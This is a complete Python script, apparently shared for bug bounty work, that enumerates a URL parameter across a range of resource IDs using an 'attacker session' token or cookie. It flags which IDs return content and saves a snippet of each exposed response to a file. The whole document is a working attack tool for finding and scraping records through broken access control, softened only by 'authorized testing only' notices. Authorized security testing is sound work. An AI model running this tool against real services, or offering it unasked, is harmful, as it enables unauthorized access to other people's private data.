#!/usr/bin/env python3
"""
IDOR Enumeration Script
=======================
Generic IDOR parameter enumerator for bug bounty testing.
Usage: python3 idor_enum.py --help

⚠️  For authorized testing only. Always stay within program scope.
"""

import argparse
import requests
import json
import time
import sys
from datetime import datetime

# ─── ANSI Colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════╗
║        IDOR Enumerator v1.0              ║
║   For authorized bug bounty testing only ║
╚══════════════════════════════════════════╝{RESET}
""")

def build_url(base_url: str, param: str, value: int) -> str:
    """Append or replace the target parameter in the URL."""
    if "?" in base_url:
        return f"{base_url}&{param}={value}"
    return f"{base_url}?{param}={value}"

def test_idor(args):
    banner()

    session = requests.Session()

    # Set auth headers or cookies
    headers = {"User-Agent": "IDOR-Tester/1.0"}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"
    if args.cookie:
        session.headers.update({"Cookie": args.cookie})

    results = []
    found = 0

    print(f"{BOLD}[*] Target URL : {args.url}{RESET}")
    print(f"{BOLD}[*] Parameter  : {args.param}{RESET}")
    print(f"{BOLD}[*] Range      : {args.start} → {args.end}{RESET}")
    print(f"{BOLD}[*] Delay      : {args.delay}s{RESET}\n")

    for resource_id in range(args.start, args.end + 1):
        url = build_url(args.url, args.param, resource_id)

        try:
            resp = session.get(url, headers=headers, timeout=10)

            if resp.status_code == 200:
                print(f"  {GREEN}[FOUND]{RESET} ID={resource_id} | Status=200 | Length={len(resp.text)}")
                results.append({
                    "id": resource_id,
                    "url": url,
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "snippet": resp.text[:200]
                })
                found += 1

            elif resp.status_code == 403:
                print(f"  {YELLOW}[DENY]{RESET}  ID={resource_id} | Status=403")

            elif resp.status_code == 404:
                print(f"  {RED}[MISS]{RESET}  ID={resource_id} | Status=404")

            else:
                print(f"  [????]  ID={resource_id} | Status={resp.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"  {RED}[ERR]{RESET}   ID={resource_id} | {e}")

        time.sleep(args.delay)

    # ─── Save Results ──────────────────────────────────────────────────────────
    if results and args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{GREEN}[+] Results saved to: {args.output}{RESET}")

    print(f"\n{BOLD}{'─'*45}")
    print(f"  Total Tested : {args.end - args.start + 1}")
    print(f"  Found (200)  : {found}")
    print(f"  Timestamp    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*45}{RESET}")

def main():
    parser = argparse.ArgumentParser(
        description="IDOR Parameter Enumerator — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",    required=True,  help="Base URL\n  e.g. https://target.com/api/billing/invoice")
    parser.add_argument("--param",  required=True,  help="Parameter name to enumerate\n  e.g. invoice_id")
    parser.add_argument("--start",  type=int, default=1,    help="Start ID (default: 1)")
    parser.add_argument("--end",    type=int, default=100,  help="End ID (default: 100)")
    parser.add_argument("--token",  default=None,   help="Bearer token (attacker session)")
    parser.add_argument("--cookie", default=None,   help="Cookie string (attacker session)")
    parser.add_argument("--delay",  type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output", default="idor_results.json", help="Output file for found results (default: idor_results.json)")

    args = parser.parse_args()
    test_idor(args)

if __name__ == "__main__":
    main()
